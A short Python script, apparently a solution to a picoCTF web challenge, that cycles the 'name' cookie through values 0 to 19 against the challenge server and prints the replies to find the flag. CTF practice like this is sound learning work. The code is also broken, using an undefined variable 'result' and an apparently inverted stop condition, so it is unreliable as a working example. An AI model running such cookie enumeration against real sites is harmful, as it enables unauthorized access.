
import requests
url = "http://mercury.picoctf.net:63578/index.php"

for i in range(0, 20):
    text = str(i)
    cookies = {
        'name': text
    }

    r = requests.post(url, cookies=cookies)
    print  (r.text)
    print("[+] Testing Cookie:{} | Result: {}".format(i, result))
    if 'pico' not in result:
        print(r.text.split("<code>")[1].split("</code>")[0])
        break